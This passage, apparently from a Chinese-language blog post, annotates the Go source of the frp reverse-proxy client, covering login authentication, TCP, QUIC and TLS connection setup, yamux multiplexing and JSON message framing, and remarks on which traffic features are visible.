*svr.clientSpec<br>&#125;<br><br><span class="hljs-comment">// Add auth</span><br><span class="hljs-comment">// 设置登录消息中的私钥</span><br><span class="hljs-keyword">if</span> err = svr.authSetter.SetLogin(loginMsg); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 发送登录请求 =&gt; 这里是直接发送的 JSON 还没有加密, 但是使用 TLS 的话也看不出来</span><br><span class="hljs-keyword">if</span> err = msg.WriteMsg(conn, loginMsg); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">var</span> loginRespMsg msg.LoginResp<br><span class="hljs-comment">// 等待响应超时时间 10s</span><br>_ = conn.SetReadDeadline(time.Now().Add(<span class="hljs-number">10</span> * time.Second))<br><span class="hljs-comment">// 获取响应</span><br><span class="hljs-keyword">if</span> err = msg.ReadMsgInto(conn, &amp;loginRespMsg); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 清空</span><br>_ = conn.SetReadDeadline(time.Time&#123;&#125;)<br><span class="hljs-comment">// 登录失败</span><br><span class="hljs-keyword">if</span> loginRespMsg.Error != <span class="hljs-string">&quot;&quot;</span> &#123;<br>err = fmt.Errorf(<span class="hljs-string">&quot;%s&quot;</span>, loginRespMsg.Error)<br>xl.Errorf(<span class="hljs-string">&quot;%s&quot;</span>, loginRespMsg.Error)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 登录成功</span><br>svr.runID = loginRespMsg.RunID<br>xl.AddPrefix(xlog.LogPrefix&#123;Name: <span class="hljs-string">&quot;runID&quot;</span>, Value: svr.runID&#125;)<br><br>xl.Infof(<span class="hljs-string">&quot;login to server success, get run id [%s]&quot;</span>, loginRespMsg.RunID)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="connector-Open"><a href="#connector-Open" class="headerlink" title="connector.Open()"></a>connector.Open()</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// Open opens an underlying connection to the server.</span><br><span class="hljs-comment">// The underlying connection is either a TCP connection or a QUIC connection.</span><br><span class="hljs-comment">// After the underlying connection is established, you can call Connect() to get a stream.</span><br><span class="hljs-comment">// If TCPMux isn&#x27;t enabled, the underlying connection is nil, you will get a new real TCP connection every time you call Connect().</span><br><span class="hljs-comment">// 打开到服务器的底层连接。</span><br><span class="hljs-comment">// 底层连接是TCP连接或QUIC连接。</span><br><span class="hljs-comment">// 底层连接建立后，你可以调用Connect()来获取流。</span><br><span class="hljs-comment">// 如果TCPMux未启用，底层连接为nil，每次调用Connect（）时都将获得一个新的真实TCP连接。</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *defaultConnectorImpl)</span></span> Open() <span class="hljs-type">error</span> &#123;<br>xl := xlog.FromContextSafe(c.ctx)<br><br><span class="hljs-comment">// special for quic</span><br><span class="hljs-comment">// quic 的连接</span><br><span class="hljs-keyword">if</span> strings.EqualFold(c.cfg.Transport.Protocol, <span class="hljs-string">&quot;quic&quot;</span>) &#123;<br><span class="hljs-keyword">var</span> tlsConfig *tls.Config<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>sn := c.cfg.Transport.TLS.ServerName<br><span class="hljs-keyword">if</span> sn == <span class="hljs-string">&quot;&quot;</span> &#123;<br>sn = c.cfg.ServerAddr<br>&#125;<br><span class="hljs-keyword">if</span> lo.FromPtr(c.cfg.Transport.TLS.Enable) &#123;<br>tlsConfig, err = transport.NewClientTLSConfig(<br>c.cfg.Transport.TLS.CertFile,<br>c.cfg.Transport.TLS.KeyFile,<br>c.cfg.Transport.TLS.TrustedCaFile,<br>sn)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>tlsConfig, err = transport.NewClientTLSConfig(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, sn)<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>xl.Warnf(<span class="hljs-string">&quot;fail to build tls configuration, err: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span> err<br>&#125;<br>tlsConfig.NextProtos = []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;frp&quot;</span>&#125;<br><br>conn, err := quic.DialAddr(<br>c.ctx,<br>net.JoinHostPort(c.cfg.ServerAddr, strconv.Itoa(c.cfg.ServerPort)),<br>tlsConfig, &amp;quic.Config&#123;<br>MaxIdleTimeout:     time.Duration(c.cfg.Transport.QUIC.MaxIdleTimeout) * time.Second,<br>MaxIncomingStreams: <span class="hljs-type">int64</span>(c.cfg.Transport.QUIC.MaxIncomingStreams),<br>KeepAlivePeriod:    time.Duration(c.cfg.Transport.QUIC.KeepalivePeriod) * time.Second,<br>&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>c.quicConn = conn<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-keyword">if</span> !lo.FromPtr(c.cfg.Transport.TCPMux) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-comment">// 建立 TCP 连接</span><br>conn, err := c.realConnect()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-comment">// 多路复用 =&gt; github.com/hashicorp/yamux</span><br>fmuxCfg := fmux.DefaultConfig()<br>fmuxCfg.KeepAliveInterval = time.Duration(c.cfg.Transport.TCPMuxKeepaliveInterval) * time.Second<br>fmuxCfg.LogOutput = io.Discard<br>fmuxCfg.MaxStreamWindowSize = <span class="hljs-number">6</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span><br>session, err := fmux.Client(conn, fmuxCfg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>c.muxSession = session<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>c.realConnect()</p><p>使用作者封装的 <code>github.com/fatedier/golib/net</code>​ 去建立连接。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *defaultConnectorImpl)</span></span> realConnect() (net.Conn, <span class="hljs-type">error</span>) &#123;<br>xl := xlog.FromContextSafe(c.ctx)<br><span class="hljs-keyword">var</span> tlsConfig *tls.Config<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>tlsEnable := lo.FromPtr(c.cfg.Transport.TLS.Enable)<br><span class="hljs-keyword">if</span> c.cfg.Transport.Protocol == <span class="hljs-string">&quot;wss&quot;</span> &#123;<br>tlsEnable = <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-comment">// TLS 配置 =&gt; 默认开启 TLS </span><br><span class="hljs-keyword">if</span> tlsEnable &#123;<br>sn := c.cfg.Transport.TLS.ServerName<br><span class="hljs-keyword">if</span> sn == <span class="hljs-string">&quot;&quot;</span> &#123;<br>sn = c.cfg.ServerAddr<br>&#125;<br><br>tlsConfig, err = transport.NewClientTLSConfig(<br>c.cfg.Transport.TLS.CertFile,<br>c.cfg.Transport.TLS.KeyFile,<br>c.cfg.Transport.TLS.TrustedCaFile,<br>sn)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>xl.Warnf(<span class="hljs-string">&quot;fail to build tls configuration, err: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br>proxyType, addr, auth, err := libnet.ParseProxyURL(c.cfg.Transport.ProxyURL)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>xl.Errorf(<span class="hljs-string">&quot;fail to parse proxy url&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-comment">// 连接的配置信息</span><br>dialOptions := []libnet.DialOption&#123;&#125;<br>protocol := c.cfg.Transport.Protocol<br><span class="hljs-keyword">switch</span> protocol &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;websocket&quot;</span>:<br>protocol = <span class="hljs-string">&quot;tcp&quot;</span><br>dialOptions = <span class="hljs-built_in">append</span>(dialOptions, libnet.WithAfterHook(libnet.AfterHook&#123;Hook: netpkg.DialHookWebsocket(protocol, <span class="hljs-string">&quot;&quot;</span>)&#125;))<br>dialOptions = <span class="hljs-built_in">append</span>(dialOptions, libnet.WithAfterHook(libnet.AfterHook&#123;<br>Hook: netpkg.DialHookCustomTLSHeadByte(tlsConfig != <span class="hljs-literal">nil</span>, lo.FromPtr(c.cfg.Transport.TLS.DisableCustomTLSFirstByte)),<br>&#125;))<br>dialOptions = <span class="hljs-built_in">append</span>(dialOptions, libnet.WithTLSConfig(tlsConfig))<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;wss&quot;</span>:<br>protocol = <span class="hljs-string">&quot;tcp&quot;</span><br>dialOptions = <span class="hljs-built_in">append</span>(dialOptions, libnet.WithTLSConfigAndPriority(<span class="hljs-number">100</span>, tlsConfig))<br><span class="hljs-comment">// Make sure that if it is wss, the websocket hook is executed after the tls hook.</span><br>dialOptions = <span class="hljs-built_in">append</span>(dialOptions, libnet.WithAfterHook(libnet.AfterHook&#123;Hook: netpkg.DialHookWebsocket(protocol, tlsConfig.ServerName), Priority: <span class="hljs-number">110</span>&#125;))<br><span class="hljs-keyword">default</span>:<br><span class="hljs-comment">// 默认的配置</span><br><span class="hljs-comment">// 自定义 TLS 首字节设置</span><br>dialOptions = <span class="hljs-built_in">append</span>(dialOptions, libnet.WithAfterHook(libnet.AfterHook&#123;<br>Hook: netpkg.DialHookCustomTLSHeadByte(tlsConfig != <span class="hljs-literal">nil</span>, lo.FromPtr(c.cfg.Transport.TLS.DisableCustomTLSFirstByte)),<br>&#125;))<br><span class="hljs-comment">// TLS Config</span><br>dialOptions = <span class="hljs-built_in">append</span>(dialOptions, libnet.WithTLSConfig(tlsConfig))<br>&#125;<br><br><span class="hljs-keyword">if</span> c.cfg.Transport.ConnectServerLocalIP != <span class="hljs-string">&quot;&quot;</span> &#123;<br>dialOptions = <span class="hljs-built_in">append</span>(dialOptions, libnet.WithLocalAddr(c.cfg.Transport.ConnectServerLocalIP))<br>&#125;<br><span class="hljs-comment">// 必须的配置</span><br>dialOptions = <span class="hljs-built_in">append</span>(dialOptions,<br>libnet.WithProtocol(protocol),<br>libnet.WithTimeout(time.Duration(c.cfg.Transport.DialServerTimeout)*time.Second),<br>libnet.WithKeepAlive(time.Duration(c.cfg.Transport.DialServerKeepAlive)*time.Second),<br>libnet.WithProxy(proxyType, addr),<br>libnet.WithProxyAuth(auth),<br>)<br><span class="hljs-comment">// 建立连接</span><br>conn, err := libnet.DialContext(<br>c.ctx,<br>net.JoinHostPort(c.cfg.ServerAddr, strconv.Itoa(c.cfg.ServerPort)),<br>dialOptions...,<br>)<br><span class="hljs-keyword">return</span> conn, err<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">DialHookCustomTLSHeadByte</span><span class="hljs-params">(enableTLS <span class="hljs-type">bool</span>, disableCustomTLSHeadByte <span class="hljs-type">bool</span>)</span></span> libnet.AfterHookFunc &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, c net.Conn, addr <span class="hljs-type">string</span>)</span></span> (context.Context, net.Conn, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// 开启 TLS 和使用自定义首字节就先向连接中写入自定义的 0x17 =&gt; 默认是关闭的</span><br><span class="hljs-keyword">if</span> enableTLS &amp;&amp; !disableCustomTLSHeadByte &#123;<br>_, err := c.Write([]<span class="hljs-type">byte</span>&#123;<span class="hljs-type">byte</span>(FRPTLSHeadByte)&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> ctx, c, <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>多路复用使用的是 <code>github.com/hashicorp/yamux</code> ​库，Yamux 提供 session 管理机制，主要用来保存 Yamux session 和 Agent 对应关系。 每个内网可以运行多个 Agent，每次新建连接会从已有的 Agent session 列表中随机选择一个 session，并通过创建一个新的 Yamux Stream 机制复用连接。</p><h5 id="connector-Connect"><a href="#connector-Connect" class="headerlink" title="connector.Connect()"></a>connector.Connect()</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-comment">// Connect returns a stream from the underlying connection, or a new TCP connection if TCPMux isn&#x27;t enabled.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *defaultConnectorImpl)</span></span> Connect() (net.Conn, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// QUIC 或者 TCP MUX 返回一个流</span><br><span class="hljs-keyword">if</span> c.quicConn != <span class="hljs-literal">nil</span> &#123;<br>stream, err := c.quicConn.OpenStreamSync(context.Background())<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> netpkg.QuicStreamToNetConn(stream, c.quicConn), <span class="hljs-literal">nil</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> c.muxSession != <span class="hljs-literal">nil</span> &#123;<br>stream, err := c.muxSession.OpenStream()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> stream, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-comment">// TCP 的就创建一个连接</span><br><span class="hljs-keyword">return</span> c.realConnect()<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="svr-authSetter-SetLogin-loginMsg"><a href="#svr-authSetter-SetLogin-loginMsg" class="headerlink" title="svr.authSetter.SetLogin(loginMsg)"></a>svr.authSetter.SetLogin(loginMsg)</h5><p>认证有 Token 和 Oidc ，这里只看 Token：</p><p>基于用户设置的 Token 和时间戳来生成一个加密的私钥。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(auth *TokenAuthSetterVerifier)</span></span> SetLogin(loginMsg *msg.Login) <span class="hljs-type">error</span> &#123;<br>loginMsg.PrivilegeKey = util.GetAuthKey(auth.token, loginMsg.Timestamp)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetAuthKey</span><span class="hljs-params">(token <span class="hljs-type">string</span>, timestamp <span class="hljs-type">int64</span>)</span></span> (key <span class="hljs-type">string</span>) &#123;<br>md5Ctx := md5.New()<br>md5Ctx.Write([]<span class="hljs-type">byte</span>(token))<br>md5Ctx.Write([]<span class="hljs-type">byte</span>(strconv.FormatInt(timestamp, <span class="hljs-number">10</span>)))<br>data := md5Ctx.Sum(<span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">return</span> hex.EncodeToString(data)<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="消息"><a href="#消息" class="headerlink" title="消息"></a>消息</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-keyword">package</span> msg<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;io&quot;</span><br><br>jsonMsg <span class="hljs-string">&quot;github.com/fatedier/golib/msg/json&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Message = jsonMsg.Message<br><br><span class="hljs-keyword">var</span> msgCtl *jsonMsg.MsgCtl<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>msgCtl = jsonMsg.NewMsgCtl()<br><span class="hljs-keyword">for</span> typeByte, msg := <span class="hljs-keyword">range</span> msgTypeMap &#123;<br>msgCtl.RegisterMsg(typeByte, msg)<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadMsg</span><span class="hljs-params">(c io.Reader)</span></span> (msg Message, err <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> msgCtl.ReadMsg(c)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadMsgInto</span><span class="hljs-params">(c io.Reader, msg Message)</span></span> (err <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> msgCtl.ReadMsgInto(c, msg)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WriteMsg</span><span class="hljs-params">(c io.Writer, msg <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (err <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> msgCtl.WriteMsg(c, msg)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>github.com&#x2F;fatedier&#x2F;golib&#x2F;msg&#x2F;json 库，可以发现这里就是直接去向连接中写入 json 的消息了，所以如果是普通的 TCP 连接就是开了流量加密的话也是能够看到特征的。因为登录这里并没有流量加密。当然默认的 TLS 就不会出现什么特征。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-keyword">package</span> json<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;encoding/binary&quot;</span><br><span class="hljs-string">&quot;errors&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>ErrMsgType      = errors.New(<span class="hljs-string">&quot;message type error&quot;</span>)<br>ErrMaxMsgLength = errors.New(<span class="hljs-string">&quot;message length exceed the limit&quot;</span>)<br>ErrMsgLength    = errors.New(<span class="hljs-string">&quot;message length error&quot;</span>)<br>ErrMsgFormat    = errors.New(<span class="hljs-string">&quot;message format error&quot;</span>)<br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(msgCtl *MsgCtl)</span></span> readMsg(c io.Reader) (typeByte <span class="hljs-type">byte</span>, buffer []<span class="hljs-type">byte</span>, err <span class="hljs-type">error</span>) &#123;<br>buffer = <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">1</span>)<br>_, err = c.Read(buffer)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>typeByte = buffer[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">if</span> _, ok := msgCtl.typeMap[typeByte]; !ok &#123;<br>err = ErrMsgType<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">var</span> length <span class="hljs-type">int64</span><br>err = binary.Read(c, binary.BigEndian, &amp;length)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> length &gt; msgCtl.maxMsgLength &#123;<br>err = ErrMaxMsgLength<br><span class="hljs-keyword">return</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> length &lt; <span class="hljs-number">0</span> &#123;<br>err = ErrMsgLength<br><span class="hljs-keyword">return</span><br>&#125;<br><br>buffer = <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, length)<br>n, err := io.ReadFull(c, buffer)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> <span class="hljs-type">int64</span>(n) != length &#123;<br>err = ErrMsgFormat<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(msgCtl *MsgCtl)</span></span> ReadMsg(c io.Reader) (msg Message, err <span class="hljs-type">error</span>) &#123;<br>typeByte, buffer, err := msgCtl.readMsg(c)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">return</span> msgCtl.UnPack(typeByte, buffer)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(msgCtl *MsgCtl)</span></span> ReadMsgInto(c io.Reader, msg Message) (err <span class="hljs-type">error</span>) &#123;<br>_, buffer, err := msgCtl.readMsg(c)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">return</span> msgCtl.UnPackInto(buffer, msg)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(msgCtl *MsgCtl)</span></span> WriteMsg(c io.Writer, msg <span class="hljs-keyword">interface</span>&#123;&#125;) (err <span class="hljs-type">error</span>) &#123;<br>buffer, err := msgCtl.Pack(msg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> _, err = c.Write(buffer); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="NewControl-svr-ctx-sessionCtx"><a href="#NewControl-svr-ctx-sessionCtx" class="headerlink" title="NewControl(svr.ctx, sessionCtx)"></a>NewControl(svr.ctx, sessionCtx)</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span 